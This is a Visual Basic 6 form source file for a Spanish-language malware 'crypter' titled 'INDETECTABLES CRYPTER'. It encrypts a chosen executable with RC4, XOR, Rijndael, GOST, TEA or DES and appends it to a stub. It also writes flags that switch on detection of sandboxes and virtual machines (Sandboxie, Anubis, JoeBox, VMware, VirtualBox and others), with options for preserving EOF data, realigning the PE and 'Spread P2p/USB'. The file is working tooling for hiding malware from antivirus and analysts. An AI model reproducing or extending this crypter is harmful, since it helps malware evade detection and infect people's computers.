VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "                                                 -=-=-=-=/*/*/ INDETECTABLES CRYPTER \*\*\=-=-=-=-"
   ClientHeight    =   7335
   ClientLeft      =   2130
   ClientTop       =   2070
   ClientWidth     =   9630
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7335
   ScaleWidth      =   9630
   Begin MSComDlg.CommonDialog CD 
      Left            =   9120
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.PictureBox Picture2 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   2250
      Left            =   360
      Picture         =   "frmMain.frx":1FED1
      ScaleHeight     =   2250
      ScaleWidth      =   9000
      TabIndex        =   1
      Top             =   120
      Width           =   9000
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00FFFFFF&
      Height          =   4815
      Left            =   120
      TabIndex        =   0
      Top             =   2400
      Width           =   9375
      Begin Proyecto1.Button cmdCrear 
         Height          =   495
         Left            =   6840
         TabIndex        =   6
         Top             =   3480
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   873
         ButtonStyle     =   7
         ButtonStyleColors=   3
         PictureAlignment=   3
         BackColor       =   14211288
         BackColorPressed=   15715986
         BackColorHover  =   16243621
         BorderColor     =   9408398
         BorderColorPressed=   6045981
         BorderColorHover=   11632444
         ForeColorPressed=   16711680
         Caption         =   "Encriptar!"
         Picture         =   "frmMain.frx":2CF97
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Frame Frame5 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Opciones "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1215
         Left            =   120
         TabIndex        =   5
         Top             =   3360
         Width           =   6615
         Begin VB.CheckBox Check10 
            Caption         =   "Spread P2p/USB"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   4440
            TabIndex        =   30
            Top             =   600
            Width           =   2055
         End
         Begin VB.CheckBox chkPE 
            Caption         =   "Re-Align PE"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   2400
            TabIndex        =   22
            Top             =   600
            Width           =   1455
         End
         Begin VB.CheckBox Check1 
            Caption         =   "EOF Data"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   240
            TabIndex        =   21
            Top             =   600
            Width           =   1335
         End
         Begin VB.PictureBox Picture5 
            AutoSize        =   -1  'True
            BorderStyle     =   0  'None
            Height          =   240
            Left            =   960
            Picture         =   "frmMain.frx":2D531
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   11
            Top             =   0
            Width           =   240
         End
      End
      Begin VB.Frame Frame4 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Anti-Debugging  "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1215
         Left            =   3840
         TabIndex        =   4
         Top             =   2160
         Width           =   5415
         Begin VB.CheckBox Check9 
            BackColor       =   &H00FFFFFF&
            Caption         =   "VBox"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   285
            Left            =   4200
            TabIndex        =   34
            Top             =   720
            Width           =   735
         End
         Begin VB.CheckBox Check8 
            BackColor       =   &H00FFFFFF&
            Caption         =   "VPC"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   285
            Left            =   3000
            TabIndex        =   33
            Top             =   720
            Width           =   735
         End
         Begin VB.CheckBox Check7 
            BackColor       =   &H00FFFFFF&
            Caption         =   "CWSandBox"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   285
            Left            =   1440
            TabIndex        =   32
            Top             =   720
            Width           =   1335
         End
         Begin VB.CheckBox Check6 
            BackColor       =   &H00FFFFFF&
            Caption         =   "VMware"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   285
            Left            =   120
            TabIndex        =   31
            Top             =   720
            Width           =   1095
         End
         Begin VB.CheckBox Check2 
            BackColor       =   &H00FFFFFF&
            Caption         =   "SandBoxie"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   285
            Left            =   120
            TabIndex        =   26
            Top             =   360
            Width           =   1215
         End
         Begin VB.CheckBox Check3 
            BackColor       =   &H00FFFFFF&
            Caption         =   "ThreatExpert"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   285
            Left            =   1440
            TabIndex        =   25
            Top             =   360
            Width           =   1455
         End
         Begin VB.CheckBox Check4 
            BackColor       =   &H00FFFFFF&
            Caption         =   "Anubis"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   285
            Left            =   3000
            TabIndex        =   24
            Top             =   360
            Width           =   975
         End
         Begin VB.CheckBox Check5 
            BackColor       =   &H00FFFFFF&
            Caption         =   "JoeBox"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   9.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00000000&
            Height          =   285
            Left            =   4200
            TabIndex        =   23
            Top             =   360
            Width           =   975
         End
         Begin VB.PictureBox Picture3 
            AutoSize        =   -1  'True
            BorderStyle     =   0  'None
            Height          =   240
            Left            =   1560
            Picture         =   "frmMain.frx":2DABB
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   9
            Top             =   0
            Width           =   240
         End
      End
      Begin VB.Frame Frame3 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Método de Encriptación "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1215
         Left            =   120
         TabIndex        =   3
         Top             =   2160
         Width           =   3615
         Begin VB.OptionButton Option6 
            Caption         =   "DES"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   2280
            TabIndex        =   29
            Top             =   840
            Width           =   855
         End
         Begin VB.OptionButton Option5 
            Caption         =   "TEA"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1320
            TabIndex        =   28
            Top             =   840
            Width           =   855
         End
         Begin VB.OptionButton Option4 
            Caption         =   "Gost"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   27
            Top             =   840
            Width           =   855
         End
         Begin VB.OptionButton Option3 
            Caption         =   "Rijndael"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   2280
            TabIndex        =   20
            Top             =   360
            Width           =   1215
         End
         Begin VB.OptionButton Option2 
            Caption         =   "XOR"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1320
            TabIndex        =   19
            Top             =   360
            Width           =   855
         End
         Begin VB.OptionButton Option1 
            Caption         =   "RC4"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   18
            Top             =   360
            Value           =   -1  'True
            Width           =   855
         End
         Begin VB.PictureBox Picture4 
            AutoSize        =   -1  'True
            BorderStyle     =   0  'None
            Height          =   240
            Left            =   2160
            Picture         =   "frmMain.frx":2E045
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   10
            Top             =   0
            Width           =   240
         End
      End
      Begin VB.Frame Frame2 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Manejo de Archivos  "
         DragIcon        =   "frmMain.frx":2E5CF
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1935
         Left            =   120
         TabIndex        =   2
         Top             =   240
         Width           =   9115
         Begin VB.TextBox Text2 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   11.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   1560
            TabIndex        =   15
            Top             =   1200
            Width           =   5655
         End
         Begin VB.TextBox Text1 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   12
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   1560
            TabIndex        =   13
            Top             =   480
            Width           =   5655
         End
         Begin VB.PictureBox Picture1 
            AutoSize        =   -1  'True
            BorderStyle     =   0  'None
            Height          =   240
            Left            =   1920
            Picture         =   "frmMain.frx":2EB59
            ScaleHeight     =   240
            ScaleWidth      =   240
            TabIndex        =   8
            Top             =   0
            Width           =   240
         End
         Begin Proyecto1.Button cmdBuscar 
            Height          =   375
            Left            =   7320
            TabIndex        =   16
            Top             =   480
            Width           =   1695
            _ExtentX        =   2990
            _ExtentY        =   661
            ButtonStyle     =   7
            ButtonStyleColors=   3
            PictureAlignment=   3
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            ForeColorPressed=   16711680
            Caption         =   "Buscar"
            Picture         =   "frmMain.frx":2F0E3
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin Proyecto1.Button cmdGenerar 
            Height          =   375
            Left            =   7320
            TabIndex        =   17
            Top             =   1200
            Width           =   1695
            _ExtentX        =   2990
            _ExtentY        =   661
            ButtonStyle     =   7
            ButtonStyleColors=   3
            PictureAlignment=   3
            BackColor       =   14211288
            BackColorPressed=   15715986
            BackColorHover  =   16243621
            BorderColor     =   9408398
            BorderColorPressed=   6045981
            BorderColorHover=   11632444
            ForeColorPressed=   16711680
            Caption         =   "Rnd"
            Picture         =   "frmMain.frx":2F67D
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
         End
         Begin VB.Label Label2 
            Alignment       =   2  'Center
            Caption         =   "Key"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   14.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   240
            TabIndex        =   14
            Top             =   1200
            Width           =   1215
         End
         Begin VB.Label Label1 
            Alignment       =   2  'Center
            Caption         =   "Archivo"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   14.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   375
            Left            =   240
            TabIndex        =   12
            Top             =   480
            Width           =   1215
         End
      End
      Begin Proyecto1.Button cmdAbout 
         Height          =   495
         Left            =   6840
         TabIndex        =   7
         Top             =   4080
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   873
         ButtonStyle     =   7
         ButtonStyleColors=   3
         PictureAlignment=   3
         BackColor       =   14211288
         BackColorPressed=   15715986
         BackColorHover  =   16243621
         BorderColor     =   9408398
         BorderColorPressed=   6045981
         BorderColorHover=   11632444
         ForeColorPressed=   16711680
         Caption         =   "About..."
         Picture         =   "frmMain.frx":2FC17
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'//-> CONSTANTES
Const a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const b = "abcdefghijklmnopqrstuvwxyz"
Const c = "1234567890"

'//->RANDOMIZE
Public Function sRandom()
Dim zeichen As String
Dim i As Integer

zeichen = a + b + c

For i = 1 To 50
    sRandom = sRandom & Mid$(zeichen, Int((Rnd * Len(zeichen)) + 1), 1)
Next i
End Function

Private Sub cmdAbout_Click()
Form2.Show vbModal
End Sub

'//-> BUSCAR EL ARCHIVO
Private Sub cmdBuscar_Click()
With CD
    .DialogTitle = "Selecciona el archivo a encriptar!"
    .Filter = "Archivos Ejecutables EXE|*.exe"
    .ShowOpen
End With

If Dir(CD.Filename) = vbNullString Then Exit Sub
    Text1.Text = CD.Filename
End Sub

'//-> ENCRIPTAR
Private Sub cmdCrear_Click()

Dim Stub    As String

If Text1.Text = vbNullString Then
    MsgBox "El archivo no se ha cargado", vbInformation, "Error"
    Exit Sub
End If

With CD
    .DialogTitle = "Seleccione la ruta donde desea guardar el archivo!"
    .Filter = "Archivos Ejecutables EXE|*.exe"
    .ShowSave
End With

Open App.Path & "\" & "Stub.dll" For Binary As #1
    Stub = Space(LOF(1))
    Get #1, , Stub
Close #1


Dim EOF     As String
Dim Enc     As String
Dim File    As String


'//-> ReadEOFData
If Check1.Value = 1 Then EOF = ReadEOFData(Text1.Text)


Open Text1.Text For Binary As #1
    File = Space(LOF(1))
    Get #1, , File
Close #1
MsgBox File

Dim RC4             As New clsRC4
Dim xXOR            As New clsXOR
Dim Rijndael        As New clsRijndael
Dim Gost            As New clsGost
Dim TEA             As New clsTEA
Dim DES             As New clsDES


If Option1.Value = True Then
    File = RC4.EncryptString(File, Text2.Text)
    Enc = "xRC4"
End If

If Option2.Value = True Then
    File = xXOR.EncryptString(File, Text2.Text)
    Enc = "xxXOR"
End If

If Option3.Value = True Then
    File = Rijndael.EncryptString(File, Text2.Text)
    Enc = "xRijndael"
End If

If Option4.Value = True Then
    File = Gost.EncryptString(File, Text2.Text)
    Enc = "xGost"
End If

If Option5.Value = True Then
    File = TEA.EncryptString(File, Text2.Text)
    Enc = "xTEA"
End If

If Option6.Value = True Then
    File = DES.EncryptString(File, Text2.Text)
    Enc = "xDES"
End If


Dim Datos       As String
Dim Datos2      As String
MsgBox File
Datos = Stub & "&/&%&(=)%&&%" & File & "&/&%&(=)%&&%" & Enc & "&/&%&(=)%&&%" & Text2.Text & "&/&%&(=)%&&%" & "&/&%&(=)%&&%"


Open CD.Filename For Binary As #1
    Put #1, , Datos & "ANTIS"
    If Check2.Value = 1 Then Put 1, , "1" & "ANTIS" Else Put 1, , "0" & "ANTIS"
      If Check3.Value = 1 Then Put 1, , "1" & "ANTIS" Else Put 1, , "0" & "ANTIS"
        If Check4.Value = 1 Then Put 1, , "1" & "ANTIS" Else Put 1, , "0" & "ANTIS"
          If Check5.Value = 1 Then Put 1, , "1" & "ANTIS" Else Put 1, , "0" & "ANTIS"
            If Check6.Value = 1 Then Put 1, , "1" & "ANTIS" Else Put 1, , "0" & "ANTIS"
              If Check7.Value = 1 Then Put 1, , "1" & "ANTIS" Else Put 1, , "0" & "ANTIS"
                If Check8.Value = 1 Then Put 1, , "1" & "ANTIS" Else Put 1, , "0" & "ANTIS"
                  If Check9.Value = 1 Then Put 1, , "1" & "ANTIS" Else Put 1, , "0" & "ANTIS"
    Put #1, , Datos2
Close #1


'//-> WriteEOFData
If Check1.Value = 1 Then Call WriteEOFData(CD.Filename, EOF)

'//-> RE-ALIGN PE
If chkPE.Value = 1 Then
    Call RealignPEFromFile(CD.Filename)
End If
End Sub

'//->KEY
Private Sub cmdGenerar_Click()
Text2.Text = sRandom
End Sub
